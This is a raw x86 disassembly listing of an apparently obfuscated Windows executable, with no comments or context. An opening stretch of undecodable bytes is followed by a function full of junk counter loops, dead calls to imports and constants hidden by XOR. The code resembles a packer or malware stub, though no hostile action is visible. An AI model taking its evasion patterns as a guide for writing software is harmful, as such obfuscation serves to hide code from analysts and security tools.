  40e5b1:	fistp  WORD PTR [ebx]
  40e5b3:	inc    edi
  40e5b4:	je     0x40e61c
  40e5b6:	fsubr  DWORD PTR [ecx]
  40e5b8:	mov    esp,DWORD PTR [esi]
  40e5ba:	(bad)  
  40e5bb:	sub    al,0xee
  40e5bd:	dec    esp
  40e5be:	mov    eax,ds:0xd396d260
  40e5c3:	xchg   ebp,eax
  40e5c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5c5:	cmp    BYTE PTR [edx],ah
  40e5c7:	aam    0x20
  40e5c9:	sbb    dh,BYTE PTR [esi+edi*2+0x2f]
  40e5cd:	mov    bl,0x18
  40e5cf:	xor    DWORD PTR [esi+0x77],ebp
  40e5d2:	inc    edi
  40e5d3:	inc    esp
  40e5d4:	push   es
  40e5d5:	bound  esp,QWORD PTR [ecx+0x2a]
  40e5d8:	(bad)  
  40e5d9:	fild   WORD PTR [ebx]
  40e5db:	out    0x8d,al
  40e5dd:	hlt    
  40e5de:	outs   dx,DWORD PTR ds:[esi]
  40e5df:	lea    edx,[ecx+0x31533078]
  40e5e5:	or     DWORD PTR [ebp-0x1c],0xb3445779
  40e5ec:	aad    0xaf
  40e5ee:	lahf   
  40e5ef:	jp     0x40e5c0
  40e5f1:	(bad)  
  40e5f2:	adc    ecx,ebx
  40e5f4:	xchg   edx,eax
  40e5f5:	shl    BYTE PTR [edx-0x6f],1
  40e5f8:	or     eax,0x599136c3
  40e5fd:	(bad)  
  40e5fe:	jecxz  0x40e5d4
  40e600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e601:	gs sti 
  40e603:	or     eax,0xec2674f5
  40e608:	xchg   BYTE PTR [ebp-0x65],dl
  40e60b:	and    dh,BYTE PTR [edx]
  40e60d:	adc    DWORD PTR ds:0x9825f36c,ebp
  40e613:	dec    ebp
  40e614:	inc    ebp
  40e615:	sbb    BYTE PTR [edi+0x1199832f],bh
  40e61b:	push   ebp
  40e61c:	add    al,0x8d
  40e61e:	pop    esp
  40e61f:	cwde   
  40e620:	push   ebp
  40e621:	leave  
  40e622:	dec    ebp
  40e623:	add    ecx,DWORD PTR ds:0x9ad1d538
  40e629:	jnp    0x40e689
  40e62b:	jne    0x40e676
  40e62d:	ins    BYTE PTR es:[edi],dx
  40e62e:	sbb    eax,ebp
  40e630:	cmp    eax,0x251778fa
  40e635:	and    al,0xd3
  40e637:	ins    DWORD PTR es:[edi],dx
  40e638:	nop
  40e639:	pop    DWORD PTR [esi]
  40e63b:	into   
  40e63c:	dec    ecx
  40e63d:	repnz pop edx
  40e63f:	pop    edx
  40e640:	cmp    dl,ch
  40e642:	retf   
  40e643:	inc    edi
  40e644:	xchg   ebx,eax
  40e645:	xchg   BYTE PTR [edi],dl
  40e647:	sahf   
  40e648:	mov    ds:0x916978d4,al
  40e64d:	jb     0x40e69d
  40e64f:	jne    0x40e60a
  40e651:	jmp    0xf544:0xcf3988ae
  40e658:	xchg   BYTE PTR [ecx-0x256e225b],al
  40e65e:	xchg   edi,eax
  40e65f:	mov    ebx,0x9a3a691a
  40e664:	out    0xc2,eax
  40e666:	imul   ecx,esi,0x5712acdd
  40e66c:	or     edx,ebp
  40e66e:	sbb    esp,eax
  40e670:	fstp   DWORD PTR [esi]
  40e672:	arpl   WORD PTR ds:0x4d08a3c8,si
  40e678:	mov    esp,0xf4c5b428
  40e67d:	outs   dx,DWORD PTR ds:[esi]
  40e67e:	pop    edx
  40e67f:	fdivr  st(5),st
  40e681:	unpckhps xmm0,XMMWORD PTR [ecx]
  40e684:	aaa    
  40e685:	outs   dx,DWORD PTR ds:[esi]
  40e686:	aas    
  40e687:	xchg   esp,eax
  40e688:	and    eax,0xb38dca7a
  40e68d:	and    DWORD PTR [eax+0x1c7b8843],edx
  40e693:	push   esp
  40e694:	retf   0x3dcd
  40e697:	mov    ecx,0xaa9b5c52
  40e69c:	push   esi
  40e69d:	jne    0x40e689
  40e69f:	push   edi
  40e6a0:	fnsave [eax+0x3a]
  40e6a3:	rol    DWORD PTR [ebx],cl
  40e6a5:	inc    ebx
  40e6a6:	dec    esi
  40e6a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6a8:	sbb    eax,0xdc9ae472
  40e6ad:	push   cs
  40e6ae:	cld    
  40e6af:	test   al,0x41
  40e6b1:	rol    al,cl
  40e6b3:	les    ebp,FWORD PTR [edi-0x3af192be]
  40e6b9:	ficom  WORD PTR ds:0xe1229af6
  40e6bf:	sbb    DWORD PTR [eax-0x1e],ebp
  40e6c2:	pop    DWORD PTR [eax]
  40e6c4:	mov    ecx,0xdc1b13fc
  40e6c9:	pop    edi
  40e6ca:	leave  
  40e6cb:	ret    0x8
  40e6ce:	push   ebp
  40e6cf:	mov    ebp,esp
  40e6d1:	sub    esp,0xa8
  40e6d7:	sbb    DWORD PTR ds:0x434793,0x1bda
  40e6e1:	push   ebx
  40e6e2:	sbb    DWORD PTR ds:0x434743,0x5a23
  40e6ec:	push   esi
  40e6ed:	inc    DWORD PTR ds:0x4346c7
  40e6f3:	push   edi
  40e6f4:	and    DWORD PTR ds:0x4346bb,0x6624
  40e6fe:	push   0x414c56
  40e703:	adc    DWORD PTR ds:0x434683,0x6b43
  40e70d:	call   DWORD PTR ds:0x41340c
  40e713:	test   eax,eax
  40e715:	mov    DWORD PTR ds:0x4346b7,0x267
  40e71f:	je     0x40e741
  40e725:	adc    DWORD PTR ds:0x434747,0x43465f
  40e72f:	xor    eax,eax
  40e731:	inc    eax
  40e732:	mov    DWORD PTR ds:0x43466b,0x5274
  40e73c:	jmp    0x40f150
  40e741:	add    DWORD PTR ds:0x4346bb,ecx
  40e747:	mov    DWORD PTR [ebp-0x24],0xf89c8536
  40e74e:	and    DWORD PTR ds:0x434753,0x0
  40e758:	jmp    0x40e76a
  40e75d:	mov    edi,DWORD PTR ds:0x434753
  40e763:	inc    edi
  40e764:	mov    DWORD PTR ds:0x434753,edi
  40e76a:	cmp    DWORD PTR ds:0x434753,0x16
  40e771:	jae    0x40e855
  40e777:	cmp    DWORD PTR ds:0x434753,0xd
  40e77e:	jne    0x40e79e
  40e784:	push   0x43466b
  40e789:	push   0x6202
  40e78e:	push   0x434808
  40e793:	push   0x4348f1
  40e798:	call   DWORD PTR ds:0x413344
  40e79e:	cmp    DWORD PTR ds:0x434753,0xc
  40e7a5:	jne    0x40e7b8
  40e7ab:	mov    edi,DWORD PTR ds:0x434753
  40e7b1:	inc    edi
  40e7b2:	mov    DWORD PTR ds:0x434753,edi
  40e7b8:	jmp    0x40e75d
  40e7bd:	and    DWORD PTR ds:0x4346fb,0x0
  40e7c7:	jmp    0x40e7d9
  40e7cc:	mov    edi,DWORD PTR ds:0x4346fb
  40e7d2:	inc    edi
  40e7d3:	mov    DWORD PTR ds:0x4346fb,edi
  40e7d9:	cmp    DWORD PTR ds:0x4346fb,0x11
  40e7e0:	jae    0x40e855
  40e7e6:	cmp    DWORD PTR ds:0x4346fb,0x1c
  40e7ed:	jne    0x40e806
  40e7f3:	push   0x43499f
  40e7f8:	push   DWORD PTR [ebp-0x24]
  40e7fb:	push   0x501d
  40e800:	call   DWORD PTR ds:0x413348
  40e806:	jmp    0x40e7cc
  40e80b:	mov    DWORD PTR ds:0x4346bb,0x17
  40e815:	cmp    DWORD PTR ds:0x4346bb,0x0
  40e81c:	je     0x40e855
  40e822:	cmp    DWORD PTR ds:0x4346bb,0x24
  40e829:	jne    0x40e83d
  40e82f:	push   0x3379
  40e834:	push   DWORD PTR [ebp-0x24]
  40e837:	call   DWORD PTR ds:0x4130c8
  40e83d:	mov    ecx,DWORD PTR ds:0x4346bb
  40e843:	dec    ecx
  40e844:	mov    DWORD PTR ds:0x4346bb,ecx
  40e84a:	jmp    0x40e815
  40e84f:	sub    DWORD PTR ds:0x43470b,edx
  40e855:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  40e85c:	sbb    DWORD PTR ds:0x43473f,0x434687
  40e866:	lea    eax,[ebp-0x2c]
  40e869:	movzx  ecx,BYTE PTR ds:0x434673
  40e870:	and    ecx,DWORD PTR ds:0x43474f
  40e876:	mov    DWORD PTR ds:0x434673,ecx
  40e87c:	mov    DWORD PTR [ebp-0x18],eax
  40e87f:	mov    DWORD PTR ds:0x4346c7,0x13
  40e889:	cmp    DWORD PTR ds:0x4346c7,0x0
  40e890:	je     0x40e94f
  40e896:	cmp    DWORD PTR ds:0x4346c7,0x3
  40e89d:	jne    0x40e8b6
  40e8a3:	push   0x8243
  40e8a8:	push   0x5b51
  40e8ad:	push   DWORD PTR [ebp-0x18]
  40e8b0:	call   DWORD PTR ds:0x4130cc
  40e8b6:	cmp    DWORD PTR ds:0x4346c7,0x4
  40e8bd:	jne    0x40e8d0
  40e8c3:	mov    esi,DWORD PTR ds:0x4346c7
  40e8c9:	dec    esi
  40e8ca:	mov    DWORD PTR ds:0x4346c7,esi
  40e8d0:	xor    esi,esi
  40e8d2:	add    esi,DWORD PTR ds:0x4346c7
  40e8d8:	dec    esi
  40e8d9:	mov    DWORD PTR ds:0x4346c7,esi
  40e8df:	jmp    0x40e889
  40e8e4:	and    DWORD PTR ds:0x4346fb,0x0
  40e8ee:	jmp    0x40e900
  40e8f3:	mov    edi,DWORD PTR ds:0x4346fb
  40e8f9:	inc    edi
  40e8fa:	mov    DWORD PTR ds:0x4346fb,edi
  40e900:	cmp    DWORD PTR ds:0x4346fb,0x19
  40e907:	jae    0x40e94f
  40e90d:	cmp    DWORD PTR ds:0x4346fb,0xd
  40e914:	jne    0x40e92a
  40e91a:	push   0x6845
  40e91f:	push   0x434873
  40e924:	call   DWORD PTR ds:0x41334c
  40e92a:	cmp    DWORD PTR ds:0x4346fb,0xc
  40e931:	jne    0x40e944
  40e937:	mov    edi,DWORD PTR ds:0x4346fb
  40e93d:	inc    edi
  40e93e:	mov    DWORD PTR ds:0x4346fb,edi
  40e944:	jmp    0x40e8f3
  40e949:	sub    DWORD PTR ds:0x4346bf,edi
  40e94f:	lea    eax,[ebp-0x30]
  40e952:	mov    ecx,DWORD PTR ds:0x434707
  40e958:	adc    DWORD PTR ds:0x434737,ecx
  40e95e:	mov    DWORD PTR [ebp-0x14],eax
  40e961:	mov    esi,DWORD PTR ds:0x43469b
  40e967:	xor    ecx,ecx
  40e969:	or     ecx,DWORD PTR ds:0x4346d7
  40e96f:	sub    esi,ecx
  40e971:	or     esi,DWORD PTR [esi+ecx*1]
  40e974:	mov    eax,ds:0x414afe
  40e979:	mov    ebx,DWORD PTR ds:0x434733
  40e97f:	mov    ebx,DWORD PTR [ebx]
  40e981:	sub    DWORD PTR ds:0x43467f,ebx
  40e987:	mov    eax,DWORD PTR [eax+0x1c8]
  40e98d:	mov    eax,DWORD PTR [eax]
  40e98f:	or     edi,0x2360
  40e995:	mov    ecx,DWORD PTR [ebp-0x14]
  40e998:	mov    esi,0x7510851
  40e99d:	and    DWORD PTR ds:0x4346c7,0x6472
  40e9a7:	xor    eax,esi
  40e9a9:	sbb    edi,DWORD PTR ds:0x43467b
  40e9af:	mov    edi,0x327299
  40e9b4:	xor    DWORD PTR ds:0x43467b,ebx
  40e9ba:	add    eax,edi
  40e9bc:	mov    DWORD PTR [ecx],eax
  40e9be:	mov    eax,ds:0x414dae
  40e9c3:	movzx  ebx,WORD PTR ds:0x434777
  40e9ca:	cmp    eax,0x22c02f45
  40e9cf:	mov    eax,DWORD PTR [ebp-0x4]
  40e9d2:	movzx  ebx,BYTE PTR ds:0x434747
  40e9d9:	mov    ebx,0xf89c853a
  40e9de:	je     0x40ea1a
  40e9e4:	sub    DWORD PTR ds:0x43477f,edi
  40e9ea:	mov    ecx,DWORD PTR [ebp-0x24]
  40e9ed:	xor    eax,esi
  40e9ef:	add    eax,edi
  40e9f1:	sbb    DWORD PTR ds:0x434783,0x3fff
  40e9fb:	imul   eax,ecx
  40e9fe:	mov    DWORD PTR ds:0x434677,0x22e4
  40ea08:	mov    DWORD PTR [ebp-0x24],eax
  40ea0b:	mov    DWORD PTR ds:0x4346c7,0x3208
  40ea15:	jmp    0x40eab6
  40ea1a:	add    DWORD PTR ds:0x43473f,0x154a
  40ea24:	xor    eax,esi
  40ea26:	sbb    DWORD PTR ds:0x4346c7,0x7bc1
  40ea30:	add    eax,edi
  40ea32:	mov    ds:0x414c12,eax
  40ea37:	movzx  eax,BYTE PTR ds:0x43473b
  40ea3e:	sub    DWORD PTR ds:0x43473f,eax
  40ea44:	mov    eax,DWORD PTR [ebp-0x24]
  40ea47:	xor    eax,esi
  40ea49:	adc    DWORD PTR ds:0x43470f,ebx
  40ea4f:	add    eax,edi
  40ea51:	not    ecx
  40ea53:	mov    ds:0x414dae,eax
  40ea58:	mov    eax,DWORD PTR [ebp-0x4]
  40ea5b:	mov    ecx,DWORD PTR ds:0x414c12
  40ea61:	xor    eax,esi
  40ea63:	xor    DWORD PTR ds:0x434683,0x434743
  40ea6d:	add    eax,edi
  40ea6f:	mov    DWORD PTR ds:0x43470b,0x4a46
  40ea79:	cmp    ecx,eax
  40ea7b:	jne    0x40eab6
  40ea81:	sbb    DWORD PTR ds:0x434683,0x4346cf
  40ea8b:	push   ebx
  40ea8c:	mov    DWORD PTR ds:0x43473f,0x49e8
  40ea96:	push   DWORD PTR [ebp-0x4]
  40ea99:	sbb    DWORD PTR ds:0x4346bf,0x7dd1
  40eaa3:	push   DWORD PTR [ebp-0x24]
  40eaa6:	adc    DWORD PTR ds:0x43466f,0x434683
  40eab0:	call   DWORD PTR ds:0x414c0a
  40eab6:	and    edx,DWORD PTR ds:0x434683
  40eabc:	mov    eax,ds:0x414afe
  40eac1:	mov    ecx,DWORD PTR ds:0x434713
  40eac7:	and    DWORD PTR ds:0x4346c3,ecx
  40eacd:	mov    eax,DWORD PTR [eax+0x18c]
  40ead3:	sub    ecx,edx
  40ead5:	mov    eax,DWORD PTR [eax]
  40ead7:	neg    ecx
  40ead9:	mov    DWORD PTR [ebp-0x44],eax
  40eadc:	mov    DWORD PTR [ebp-0x10],ebx
  40eadf:	sub    ecx,DWORD PTR ds:0x43478f
  40eae5:	mov    DWORD PTR [ebp-0x10],ebx
  40eae8:	and    DWORD PTR ds:0x4346bf,0x0
  40eaf2:	jmp    0x40eb04
  40eaf7:	mov    ecx,DWORD PTR ds:0x4346bf
  40eafd:	inc    ecx
  40eafe:	mov    DWORD PTR ds:0x4346bf,ecx
  40eb04:	cmp    DWORD PTR ds:0x4346bf,0x1d
  40eb0b:	jae    0x40eb61
  40eb11:	cmp    DWORD PTR ds:0x4346bf,0x7
  40eb18:	jne    0x40eb2c
  40eb1e:	push   DWORD PTR [ebp-0x18]
  40eb21:	push   0x7577
  40eb26:	call   DWORD PTR ds:0x4130d0
  40eb2c:	cmp    DWORD PTR ds:0x4346bf,0x6
  40eb33:	jne    0x40eb48
  40eb39:	xor    ecx,ecx
  40eb3b:	add    ecx,DWORD PTR ds:0x4346bf
  40eb41:	inc    ecx
  40eb42:	mov    DWORD PTR ds:0x4346bf,ecx
  40eb48:	jmp    0x40eaf7
  40eb4d:	xor    edx,edx
  40eb4f:	or     edx,DWORD PTR ds:0x4346c7
  40eb55:	sbb    edx,DWORD PTR ds:0x434787
  40eb5b:	mov    DWORD PTR ds:0x4346c7,edx
  40eb61:	mov    DWORD PTR [ebp-0x10],ebx
  40eb64:	mov    ecx,DWORD PTR ds:0x43478b
  40eb6a:	or     DWORD PTR ds:0x43473b,ecx
  40eb70:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  40eb77:	or     eax,edx
  40eb79:	mov    DWORD PTR [ebp-0x10],ebx
  40eb7c:	mov    DWORD PTR [ebp-0x10],0xf89c853e
  40eb83:	xor    ecx,DWORD PTR ds:0x4346b7
  40eb89:	mov    eax,DWORD PTR [ebp-0x24]
  40eb8c:	and    edx,0x522c
  40eb92:	mov    ecx,DWORD PTR [ebp-0x4]
  40eb95:	and    DWORD PTR ds:0x43478f,edx
  40eb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40eb9e:	or     DWORD PTR ds:0x43478b,0x434747
  40eba8:	xor    edx,esi
  40ebaa:	sub    DWORD PTR ds:0x4346cf,0x434687
  40ebb4:	xor    ecx,esi
  40ebb6:	adc    DWORD PTR ds:0x43473f,0x43477b
  40ebc0:	add    ecx,edx
  40ebc2:	mov    edx,DWORD PTR [ebp-0x4]
  40ebc5:	adc    DWORD PTR ds:0x434677,0x4346f7
  40ebcf:	xor    eax,esi
  40ebd1:	xor    edx,esi
  40ebd3:	adc    DWORD PTR ds:0x434663,0x6faf
  40ebdd:	add    eax,edi
  40ebdf:	mov    DWORD PTR ds:0x434703,0x13
  40ebe9:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ebf0:	mov    DWORD PTR ds:0x4346bb,0x74ca
  40ebfa:	mov    DWORD PTR [ebp-0x20],eax
  40ebfd:	mov    DWORD PTR ds:0x4346c3,0x777a
  40ec07:	cmp    eax,ecx
  40ec09:	mov    DWORD PTR ds:0x434793,0x6f86
  40ec13:	ja     0x40ed7b
  40ec19:	jmp    0x40ec27
  40ec1e:	adc    DWORD PTR ds:0x4346fb,edi
  40ec24:	mov    eax,DWORD PTR [ebp-0x20]
  40ec27:	add    DWORD PTR ds:0x434783,0x32bd
  40ec31:	mov    ecx,DWORD PTR [ebp-0x4]
  40ec34:	xor    ecx,esi
  40ec36:	xor    DWORD PTR ds:0x434667,0x43470f
  40ec40:	lea    eax,[ecx+eax*1+0x327299]
  40ec47:	push   eax
  40ec48:	and    DWORD PTR ds:0x434713,0x0
  40ec52:	xor    eax,eax
  40ec54:	or     eax,DWORD PTR ds:0x434713
  40ec5a:	inc    eax
  40ec5b:	mov    ds:0x434713,eax
  40ec60:	cmp    DWORD PTR ds:0x434713,0x10
  40ec67:	jne    0x40ec76
  40ec6d:	push   DWORD PTR [ebp-0x1c]
  40ec70:	call   DWORD PTR ds:0x413350
  40ec76:	cmp    DWORD PTR ds:0x434713,0xf
  40ec7d:	jne    0x40ec91
  40ec83:	xor    eax,eax
  40ec85:	add    eax,DWORD PTR ds:0x434713
  40ec8b:	inc    eax
  40ec8c:	mov    ds:0x434713,eax
  40ec91:	cmp    DWORD PTR ds:0x434713,0x1c
  40ec98:	jb     0x40ec52
  40ec9e:	movzx  eax,BYTE PTR ds:0x434663
  40eca5:	adc    eax,DWORD PTR ds:0x4346fb
  40ecab:	mov    ds:0x434663,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x14]
  40ecb3:	xor    eax,esi
  40ecb5:	mov    DWORD PTR ds:0x4346bf,0x3b17
  40ecbf:	lea    eax,[ebp+eax*1+0x3272a1]
  40ecc6:	sub    DWORD PTR ds:0x434777,0x434683
  40ecd0:	push   eax
  40ecd1:	and    eax,DWORD PTR ds:0x4346fb
  40ecd7:	mov    eax,ds:0x414afe
  40ecdc:	adc    DWORD PTR ds:0x4346b7,0x7c2
  40ece6:	push   DWORD PTR [eax+0x1bc]
  40ecec:	call   0x4028d7
  40ecf1:	mov    eax,DWORD PTR [ebp-0x4]
  40ecf4:	mov    ecx,DWORD PTR [ebp-0x20]
  40ecf7:	mov    edx,DWORD PTR ds:0x43477b
  40ecfd:	or     DWORD PTR ds:0x434793,edx
  40ed03:	xor    eax,esi
  40ed05:	lea    eax,[ecx+eax*1+0x327299]
  40ed0c:	mov    ecx,DWORD PTR [ebp-0x4]
  40ed0f:	or     DWORD PTR ds:0x4346c3,edi
  40ed15:	mov    edx,DWORD PTR [ebp-0x4]
  40ed18:	sub    DWORD PTR ds:0x4346f7,0x283f
  40ed22:	xor    edx,esi
  40ed24:	xor    DWORD PTR ds:0x434753,0x4346b7
  40ed2e:	xor    ecx,esi
  40ed30:	add    ecx,edx
  40ed32:	mov    edx,DWORD PTR [ebp-0x4]
  40ed35:	and    DWORD PTR ds:0x434777,0x43467f
  40ed3f:	xor    edx,esi
  40ed41:	mov    DWORD PTR ds:0x4346b7,0x5401
  40ed4b:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ed52:	mov    DWORD PTR ds:0x434687,0x25c8
  40ed5c:	mov    DWORD PTR [ebp-0x20],eax
  40ed5f:	mov    DWORD PTR ds:0x4346bf,0x56d4
  40ed69:	cmp    eax,ecx
  40ed6b:	mov    DWORD PTR ds:0x434687,0x74b6
  40ed75:	jbe    0x40ec1e
  40ed7b:	mov    DWORD PTR ds:0x43477f,0x4be2
  40ed85:	mov    eax,DWORD PTR [ebp+0xc]
  40ed88:	add    DWORD PTR ds:0x434787,edx
  40ed8e:	mov    ds:0x414982,eax
  40ed93:	mov    eax,DWORD PTR [ebp+0x10]
  40ed96:	mov    ds:0x414bd6,eax
  40ed9b:	and    DWORD PTR ds:0x434747,0x0
  40eda5:	mov    ecx,DWORD PTR ds:0x434747
  40edab:	inc    ecx
  40edac:	mov    DWORD PTR ds:0x434747,ecx
  40edb2:	cmp    DWORD PTR ds:0x434747,0x1f
  40edb9:	jne    0x40edca
  40edbf:	push   0x4349db
  40edc4:	call   DWORD PTR ds:0x413354
  40edca:	cmp    DWORD PTR ds:0x434747,0x13
  40edd1:	jb     0x40eda5
  40edd7:	add    ecx,eax
  40edd9:	mov    eax,ds:0x414982
  40edde:	inc    ecx
  40eddf:	mov    ecx,DWORD PTR [ebp-0x18]
  40ede2:	sub    DWORD PTR ds:0x4346cf,0x1b10
  40edec:	push   DWORD PTR [ebp-0x44]
  40edef:	or     DWORD PTR ds:0x434743,0x434777
  40edf9:	sub    eax,edi
  40edfb:	sub    DWORD PTR ds:0x43467f,0x43466f
  40ee05:	push   DWORD PTR [ebp-0x30]
  40ee08:	adc    DWORD PTR ds:0x4346bb,0x5064
  40ee12:	xor    eax,esi
  40ee14:	mov    DWORD PTR [ecx],eax
  40ee16:	push   DWORD PTR [ebp-0x2c]
  40ee19:	call   0x40f157
  40ee1e:	sub    eax,edi
  40ee20:	adc    ecx,DWORD PTR ds:0x43466f
  40ee26:	xor    eax,esi
  40ee28:	mov    DWORD PTR ds:0x43467f,0x13
  40ee32:	cmp    DWORD PTR ds:0x43467f,0x0
  40ee39:	je     0x40ee7a
  40ee3f:	cmp    DWORD PTR ds:0x43467f,0x18
  40ee46:	jne    0x40ee68
  40ee4c:	push   0x4349db
  40ee51:	push   DWORD PTR [ebp-0xc]
  40ee54:	push   DWORD PTR [ebp-0x28]
  40ee57:	push   DWORD PTR [ebp-0x1c]
  40ee5a:	push   DWORD PTR [ebp-0x20]
  40ee5d:	push   0x2408
  40ee62:	call   DWORD PTR ds:0x413358
  40ee68:	mov    ecx,DWORD PTR ds:0x43467f
  40ee6e:	dec    ecx
  40ee6f:	mov    DWORD PTR ds:0x43467f,ecx
  40ee75:	jmp    0x40ee32
  40ee7a:	mov    DWORD PTR [ebp+0xc],eax
  40ee7d:	mov    ecx,DWORD PTR [ebp-0x4]
  40ee80:	mov    eax,DWORD PTR [ebp+0xc]
  40ee83:	xor    ecx,esi
  40ee85:	add    ecx,edi
  40ee87:	xor    edx,edx
  40ee89:	div    ecx
  40ee8b:	mov    ecx,DWORD PTR [ebp-0x24]
  40ee8e:	cmp    ecx,eax
  40ee90:	jne    0x40f0b9
  40ee96:	mov    eax,ds:0x414afe
  40ee9b:	mov    DWORD PTR [ebp+0x10],eax
  40ee9e:	mov    eax,ds:0x414c0e
  40eea3:	mov    DWORD PTR [ebp-0x50],eax
  40eea6:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40eead:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40eeb4:	mov    DWORD PTR [ebp-0x4c],0xf89cb536
  40eebb:	mov    DWORD PTR [ebp-0x64],0xf89f0536
  40eec2:	mov    DWORD PTR [ebp-0x60],0xf89c85f6
  40eec9:	mov    DWORD PTR [ebp-0x54],0xf89c85d6
  40eed0:	mov    eax,DWORD PTR [ebp-0x18]
  40eed3:	xor    eax,esi
  40eed5:	add    eax,edi
  40eed7:	mov    DWORD PTR [ebp-0xc],eax
  40eeda:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  40eee1:	mov    BYTE PTR [ebp-0x25],0x67
  40eee5:	mov    eax,DWORD PTR [ebp-0x18]
  40eee8:	xor    eax,esi
  40eeea:	add    eax,edi
  40eeec:	mov    DWORD PTR [ebp-0xc],eax
  40eeef:	mov    eax,DWORD PTR [ebp-0x54]
  40eef2:	xor    eax,esi
  40eef4:	add    eax,edi
  40eef6:	mov    DWORD PTR [ebp-0x40],eax
  40eef9:	mov    eax,DWORD PTR [ebp-0x4c]
  40eefc:	xor    eax,esi
  40eefe:	add    eax,edi
  40ef00:	mov    DWORD PTR [ebp-0x38],eax
  40ef03:	mov    eax,DWORD PTR [ebp-0x3c]
  40ef06:	xor    eax,esi
  40ef08:	add    eax,edi
  40ef0a:	mov    DWORD PTR [ebp-0x34],eax
  40ef0d:	lea    eax,[ebp-0xa8]
  40ef13:	mov    DWORD PTR [ebp+0xc],eax
  40ef16:	mov    eax,DWORD PTR [ebp-0x18]
  40ef19:	mov    DWORD PTR [ebp-0x14],eax
  40ef1c:	mov    eax,DWORD PTR [ebp-0x20]
  40ef1f:	mov    DWORD PTR [ebp-0x5c],ebx
  40ef22:	mov    DWORD PTR [ebp-0x10],eax
  40ef25:	mov    eax,DWORD PTR [ebp-0x5c]
  40ef28:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef2b:	xor    eax,esi
  40ef2d:	add    eax,0x327299
  40ef32:	mov    DWORD PTR [ecx],eax
  40ef34:	mov    eax,DWORD PTR [ebp-0x14]
  40ef37:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef3a:	xor    eax,esi
  40ef3c:	add    eax,edi
  40ef3e:	mov    DWORD PTR [ecx+0x4],eax
  40ef41:	mov    eax,DWORD PTR [ebp-0x34]
  40ef44:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef47:	mov    DWORD PTR [ecx+0x8],eax
  40ef4a:	mov    eax,DWORD PTR [ebp-0x38]
  40ef4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef50:	mov    DWORD PTR [ecx+0xc],eax
  40ef53:	mov    eax,DWORD PTR [ebp-0x40]
  40ef56:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef59:	mov    DWORD PTR [ecx+0x10],eax
  40ef5c:	mov    eax,eax
  40ef5e:	mov    eax,DWORD PTR [ebp-0x10]
  40ef61:	xor    eax,esi
  40ef63:	add    eax,edi
  40ef65:	je     0x40ef96
  40ef6b:	lea    eax,[ebp-0xa8]
  40ef71:	push   eax
  40ef72:	mov    eax,DWORD PTR [ebp-0x20]
  40ef75:	xor    eax,esi
  40ef77:	add    eax,edi
  40ef79:	push   eax
  40ef7a:	mov    eax,DWORD PTR [ebp+0x10]
  40ef7d:	add    eax,0xaa
  40ef82:	push   eax
  40ef83:	mov    eax,DWORD PTR [ebp+0x10]
  40ef86:	mov    eax,DWORD PTR [eax+0x198]
  40ef8c:	push   DWORD PTR [eax]
  40ef8e:	call   0x411333
  40ef93:	mov    DWORD PTR [ebp-0x8],eax
  40ef96:	cmp    DWORD PTR [ebp-0x8],0x0
  40ef9a:	je     0x40f0b9
  40efa0:	lea    eax,[ebp-0xc]
  40efa3:	mov    DWORD PTR [ebp-0x38],eax
  40efa6:	mov    eax,DWORD PTR [ebp-0x60]
  40efa9:	xor    eax,esi
  40efab:	add    eax,edi
  40efad:	mov    DWORD PTR [ebp-0x40],eax
  40efb0:	mov    eax,DWORD PTR [ebp-0x3c]
  40efb3:	xor    eax,esi
  40efb5:	add    eax,edi
  40efb7:	mov    DWORD PTR [ebp-0x10],eax
  40efba:	mov    eax,DWORD PTR [ebp-0x8]
  40efbd:	mov    DWORD PTR [ebp-0x14],eax
  40efc0:	lea    eax,[ebp-0xa8]
  40efc6:	mov    DWORD PTR [ebp+0xc],eax
  40efc9:	mov    eax,DWORD PTR [ebp-0x18]
  40efcc:	mov    DWORD PTR [ebp-0x18],eax
  40efcf:	mov    eax,DWORD PTR [ebp-0x20]
  40efd2:	mov    DWORD PTR [ebp-0x48],ebx
  40efd5:	mov    DWORD PTR [ebp-0x34],eax
  40efd8:	mov    eax,DWORD PTR [ebp-0x48]
  40efdb:	mov    ecx,DWORD PTR [ebp+0xc]
  40efde:	xor    eax,esi
  40efe0:	add    eax,0x327299
  40efe5:	mov    DWORD PTR [ecx],eax
  40efe7:	mov    eax,DWORD PTR [ebp-0x14]
  40efea:	mov    ecx,DWORD PTR [ebp+0xc]
  40efed:	mov    DWORD PTR [ecx+0x4],eax
  40eff0:	mov    eax,DWORD PTR [ebp-0x10]
  40eff3:	mov    ecx,DWORD PTR [ebp+0xc]
  40eff6:	mov    DWORD PTR [ecx+0x8],eax
  40eff9:	mov    eax,DWORD PTR [ebp-0x40]
  40effc:	mov    ecx,DWORD PTR [ebp+0xc]
  40efff:	mov    DWORD PTR [ecx+0xc],eax
  40f002:	mov    eax,DWORD PTR [ebp-0x38]
  40f005:	mov    ecx,DWORD PTR [ebp+0xc]
  40f008:	mov    DWORD PTR [ecx+0x10],eax
  40f00b:	mov    eax,eax
  40f00d:	mov    eax,DWORD PTR [ebp-0x14]
  40f010:	test   eax,eax
  40f012:	mov    eax,DWORD PTR [ebp-0x34]
  40f015:	jne    0x40f01e
  40f01b:	mov    eax,DWORD PTR [ebp-0x18]
  40f01e:	xor    eax,esi
  40f020:	add    eax,edi
  40f022:	test   eax,eax
  40f024:	je     0x40f052
  40f02a:	lea    eax,[ebp-0xa8]
  40f030:	push   eax
  40f031:	mov    eax,DWORD PTR [ebp-0x20]
  40f034:	xor    eax,esi
  40f036:	add    eax,edi
  40f038:	push   eax
  40f039:	mov    eax,DWORD PTR [ebp+0x10]
  40f03c:	add    eax,0xee
  40f041:	push   eax
